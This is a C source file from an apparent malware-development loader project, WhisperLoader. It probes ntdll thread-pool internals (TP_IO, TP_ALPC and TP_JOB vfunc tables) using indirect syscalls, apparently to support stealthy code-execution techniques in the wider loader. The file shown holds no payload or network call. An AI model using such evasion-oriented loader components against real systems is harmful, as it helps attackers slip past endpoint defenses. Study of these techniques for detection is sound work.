// Copyright 2026 MalDev Academy
// WhisperLoader - Licensed under the Apache License, Version 2.0 (the "License")
// https://github.com/Maldev-Academy/WhisperLoader
//
// Runtime probes for the three per-kind Tpp{Iop,Alpcp,Jobp}CleanupGroupMemberVFuncs
// tables inside ntdll. Each helper creates a disposable kernel object inside the
// current process, wraps it in the matching TP_* pool object, reads the embedded
// CleanupGroupMember.VFuncs pointer out of the live struct, subtracts the ntdll
// base, and releases everything it created before returning.
//
// Called once from InitializeFunctionsGlobal (main.c)
//

#include "Common.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Stub callbacks. None are ever invoked. We only read a field out of the
// freshly-allocated TP_* struct and immediately release it, so no completion
// packet is ever posted. 

static VOID NTAPI StubIoCompletion(
    _Inout_     PTP_CALLBACK_INSTANCE   Instance,
    _Inout_opt_ PVOID                   Context,
    _Inout_opt_ PVOID                   Overlapped,
    _In_        ULONG                   IoResult,
    _In_        ULONG_PTR               NumberOfBytesTransferred,
    _Inout_     PTP_IO                  Io)
{
    UNREFERENCED_PARAMETER(Instance);
    UNREFERENCED_PARAMETER(Context);
    UNREFERENCED_PARAMETER(Overlapped);
    UNREFERENCED_PARAMETER(IoResult);
    UNREFERENCED_PARAMETER(NumberOfBytesTransferred);
    UNREFERENCED_PARAMETER(Io);
}


static VOID NTAPI StubAlpcCompletion(
    _Inout_     PTP_CALLBACK_INSTANCE   Instance,
    _Inout_opt_ PVOID                   Context,
    _Inout_     PVOID                   Alpc)
{
    UNREFERENCED_PARAMETER(Instance);
    UNREFERENCED_PARAMETER(Context);
    UNREFERENCED_PARAMETER(Alpc);
}


static VOID NTAPI StubJobNotification(
    _Inout_     PTP_CALLBACK_INSTANCE   Instance,
    _Inout_opt_ PVOID                   Context,
    _In_        HANDLE                  Job,
    _In_        ULONG                   JobNotification,
    _In_opt_    ULONG_PTR               Data)
{
    UNREFERENCED_PARAMETER(Instance);
    UNREFERENCED_PARAMETER(Context);
    UNREFERENCED_PARAMETER(Job);
    UNREFERENCED_PARAMETER(JobNotification);
    UNREFERENCED_PARAMETER(Data);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


//
// Probe the TP_IO flavor via a disposable named pipe.
//

DWORD GetTppIopCleanupGroupMemberVFuncsRva(IN HMODULE hNtdllModule)
{
    HANDLE              hPipe               = NULL;
    TP_IO              *pTpIo               = NULL;
    PVOID               pVFuncs             = NULL;
    DWORD               dwTppIoRva          = 0x00;
    NTSTATUS            ntStatus            = STATUS_SUCCESS;
    WCHAR               wzPipeName[32]      = { 0 };
    UNICODE_STRING      usPipeName          = { 0 };
    OBJECT_ATTRIBUTES   ObjectAttr          = { 0 };
    IO_STATUS_BLOCK     IoStatusBlock       = { 0 };
    LARGE_INTEGER       liTimeout           = { 0 };
    unsigned int        uRand1              = 0;
    unsigned int        uRand2              = 0;
    int                 iAttempts           = 10;

    // RDRAND can transiently fail if the entropy source is busy; retry a bounded number of times.
    while (iAttempts-- > 0 && !(_rdrand32_step(&uRand1) && _rdrand32_step(&uRand2))) { /* spin */ }
    if (!uRand1 || !uRand2)
    {
        DBG("[!] _rdrand32_step Failed To Produce Entropy");
        return 0;
    }

    wsprintfW(wzPipeName, L"\\??\\pipe\\%08X%08X", uRand1, uRand2);

    g_WinAPIs.pRtlInitUnicodeString(&usPipeName, wzPipeName);

    InitializeObjectAttributes(&ObjectAttr, &usPipeName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    liTimeout.QuadPart = -500000;       // 50 ms

    INITIALIZE_SYSCALL(g_Syscalls.ntCreateNamedPipeFile);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(
                &hPipe,
                (ULONG_PTR)(GENERIC_READ | GENERIC_WRITE | FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES),
                &ObjectAttr,
                &IoStatusBlock,
                (ULONG_PTR)(FILE_SHARE_READ | FILE_SHARE_WRITE),
                (ULONG_PTR)FILE_CREATE,
                (ULONG_PTR)0,                                           // CreateOptions — overlapped, no FILE_SYNCHRONOUS_IO_*
                (ULONG_PTR)FILE_PIPE_BYTE_STREAM_TYPE,
                (ULONG_PTR)FILE_PIPE_BYTE_STREAM_MODE,
                (ULONG_PTR)FILE_PIPE_QUEUE_OPERATION,
                (ULONG_PTR)1,                                           // MaximumInstances
                (ULONG_PTR)0,                                           // InboundQuota  — system default
                (ULONG_PTR)0,                                           // OutboundQuota — system default
                &liTimeout);

    if (!NT_SUCCESS(ntStatus) || !hPipe)
    {
        DBG("[!] NtCreateNamedPipeFile Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    ntStatus = g_WinAPIs.pTpAllocIoCompletion(&pTpIo, hPipe, StubIoCompletion, NULL, NULL);
    if (!NT_SUCCESS(ntStatus) || !pTpIo)
    {
        DBG("[!] TpAllocIoCompletion Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    pVFuncs = pTpIo->CleanupGroupMember.VFuncs;
    if (!pVFuncs || (PBYTE)pVFuncs < (PBYTE)hNtdllModule)
    {
        DBG("[!] TP_IO VFuncs Pointer Out Of Range");
        goto _END_OF_FUNC;
    }

    dwTppIoRva = (DWORD)((PBYTE)pVFuncs - (PBYTE)hNtdllModule);

_END_OF_FUNC:
    
    RtlSecureZeroMemory(wzPipeName, sizeof(wzPipeName));

    if (pTpIo) g_WinAPIs.pTpReleaseIoCompletion(pTpIo);

    if (hPipe)
    {
        INITIALIZE_SYSCALL(g_Syscalls.ntClose);
        INVOKE_SYSCALL(hPipe);
    }
    return dwTppIoRva;
}


//
// Probe the TP_ALPC flavor via a disposable unnamed ALPC port.
//

DWORD GetTppAlpcpCleanupGroupMemberVFuncsRva(IN HMODULE hNtdllModule)
{
    HANDLE              hPort               = NULL;
    TP_ALPC            *pTpAlpc             = NULL;
    PVOID               pVFuncs             = NULL;
    DWORD               dwTppAlpcRva        = 0x00;
    NTSTATUS            ntStatus            = STATUS_SUCCESS;
    OBJECT_ATTRIBUTES   ObjectAttr          = { 0 };

    ObjectAttr.Length = sizeof(ObjectAttr);

    INITIALIZE_SYSCALL(g_Syscalls.ntAlpcCreatePort);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(&hPort, &ObjectAttr, NULL);

    if (!NT_SUCCESS(ntStatus) || !hPort)
    {
        DBG("[!] NtAlpcCreatePort Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    ntStatus = g_WinAPIs.pTpAllocAlpcCompletion(&pTpAlpc, hPort, StubAlpcCompletion, NULL, NULL);
    if (!NT_SUCCESS(ntStatus) || !pTpAlpc)
    {
        DBG("[!] TpAllocAlpcCompletion Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    pVFuncs = pTpAlpc->CleanupGroupMember.VFuncs;
    if (!pVFuncs || (PBYTE)pVFuncs < (PBYTE)hNtdllModule)
    {
        DBG("[!] TP_ALPC VFuncs Pointer Out Of Range");
        goto _END_OF_FUNC;
    }

    dwTppAlpcRva = (DWORD)((PBYTE)pVFuncs - (PBYTE)hNtdllModule);

_END_OF_FUNC:

    if (pTpAlpc) g_WinAPIs.pTpReleaseAlpcCompletion(pTpAlpc);

    if (hPort)
    {
        INITIALIZE_SYSCALL(g_Syscalls.ntClose);
        INVOKE_SYSCALL(hPort);
    }
    return dwTppAlpcRva;
}


//
// Probe the TP_JOB flavor via a disposable unnamed job object.
//

DWORD GetTppJobpCleanupGroupMemberVFuncsRva(IN HMODULE hNtdllModule)
{
    HANDLE              hJob                = NULL;
    TP_JOB             *pTpJob              = NULL;
    PVOID               pVFuncs             = NULL;
    DWORD               dwTppJobRva         = 0x00;
    NTSTATUS            ntStatus            = STATUS_SUCCESS;
    OBJECT_ATTRIBUTES   ObjectAttr          = { 0 };

    ObjectAttr.Length = sizeof(ObjectAttr);

    INITIALIZE_SYSCALL(g_Syscalls.ntCreateJobObject);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(&hJob, (ULONG_PTR)JOB_OBJECT_ALL_ACCESS, &ObjectAttr);

    if (!NT_SUCCESS(ntStatus) || !hJob)
    {
        DBG("[!] NtCreateJobObject Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    ntStatus = g_WinAPIs.pTpAllocJobNotification(&pTpJob, hJob, StubJobNotification, NULL, NULL);
    if (!NT_SUCCESS(ntStatus) || !pTpJob)
    {
        DBG("[!] TpAllocJobNotification Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    pVFuncs = pTpJob->CleanupGroupMember.VFuncs;
    if (!pVFuncs || (PBYTE)pVFuncs < (PBYTE)hNtdllModule)
    {
        DBG("[!] TP_JOB VFuncs Pointer Out Of Range");
        goto _END_OF_FUNC;
    }

    dwTppJobRva = (DWORD)((PBYTE)pVFuncs - (PBYTE)hNtdllModule);

_END_OF_FUNC:

    if (pTpJob) g_WinAPIs.pTpReleaseJobNotification(pTpJob);

    if (hJob)
    {
        INITIALIZE_SYSCALL(g_Syscalls.ntClose);
        INVOKE_SYSCALL(hJob);
    }
    return dwTppJobRva;
}